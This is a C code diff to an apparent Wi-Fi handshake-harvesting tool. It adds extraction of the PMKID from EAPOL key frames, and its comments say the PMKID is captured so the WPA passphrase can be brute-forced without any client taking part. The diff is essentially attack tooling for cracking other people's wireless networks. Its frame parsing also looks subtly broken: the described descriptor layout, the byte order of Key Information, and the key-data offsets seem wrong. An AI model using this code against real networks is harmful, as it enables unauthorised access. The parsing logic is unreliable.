@@ -49,6 +49,7 @@ static harvest_pair_t *pair_find_or_add(const uint8_t ap[6],
         memcpy(p->ap, ap, 6);
         memcpy(p->sta, sta, 6);
         p->msgs = 0;
+        p->has_pmkid = false;
         return p;
     }
     /* Full: evict the least-recently-active, prefer stale incomplete pairs. */
@@ -95,6 +96,34 @@ static void log_push(const uint8_t *frame, uint32_t len, uint8_t channel,
 /*  Feed path                                                           */
 /* ------------------------------------------------------------------ */
 
+/* PMKID KDE: vendor-specific IE `dd 14 00 0f ac 04` then 16 bytes of PMKID.
+   Shipped by the AP inside M1's key data when PMKSA caching is enabled; the
+   16 bytes hash as PMKID=HMAC-SHA1-128(PMK, "PMK Name" || aa || spa) and are
+   enough to brute-force the PSK with zero client involvement. */
+static void pair_extract_pmkid(harvest_pair_t *p, const uint8_t *kdata,
+                               uint32_t klen) {
+    static const uint8_t kde[6] = {0xdd, 0x14, 0x00, 0x0f, 0xac, 0x04};
+    for (uint32_t i = 0; i + 6 + 16 <= klen; i++) {
+        if (memcmp(&kdata[i], kde, 6) == 0) {
+            memcpy(p->pmkid, &kdata[i + 6], 16);
+            p->has_pmkid = true;
+            return;
+        }
+    }
+}
+
+/* Walk the frame from the start of the EAPOL key descriptor and pull any
+   PMKID KDE out of the trailing key-data payload. */
+static void pmkid_from_frame(harvest_pair_t *p, const uint8_t *frame,
+                             uint32_t kd, uint32_t len) {
+    uint8_t version = frame[kd];
+    uint32_t fixed = version >= 2 ? 97u : 96u; /* key-data length field */
+    if (kd + fixed > len) {
+        return;
+    }
+    pair_extract_pmkid(p, &frame[kd + fixed], len - (kd + fixed));
+}
+
 void harvest_feed(const uint8_t *frame, uint32_t len, uint8_t channel) {
     if (!frame || len < 24) {
         return;
@@ -131,12 +160,15 @@ void harvest_feed(const uint8_t *frame, uint32_t len, uint8_t channel) {
     if (frame[eo + 1] != 3u) {
         return; /* not an EAPOL-Key */
     }
-    uint32_t koff = eo + 4; /* start of the key descriptor */
-    if (koff + 2 > len) {
+
+    /* Key descriptor: 2-byte version (LSB first), 1-byte descriptor type
+       (254 = RSN), then the 2-byte Key Information. */
+    uint32_t kd = eo + 4;
+    if (kd + 5 > len) {
         return;
     }
 
-    uint16_t kinfo = (uint16_t)(frame[koff] | (frame[koff + 1] << 8));
+    uint16_t kinfo = (uint16_t)(frame[kd + 3] | ((uint16_t)frame[kd + 4] << 8));
     if (!(kinfo & HARVEST_KEY_PAIR)) {
         return; /* group-key handshake: useless for cracking */
     }
@@ -177,6 +209,9 @@ void harvest_feed(const uint8_t *frame, uint32_t len, uint8_t channel) {
     p->msgs |= bit;
     if (p->first_ms == 0) {
         p->first_ms = ++s_clock;
+    }
+    if (!p->has_pmkid) {
+        pmkid_from_frame(p, frame, kd, len);
     }
 
     log_push(frame, len, channel, msg);
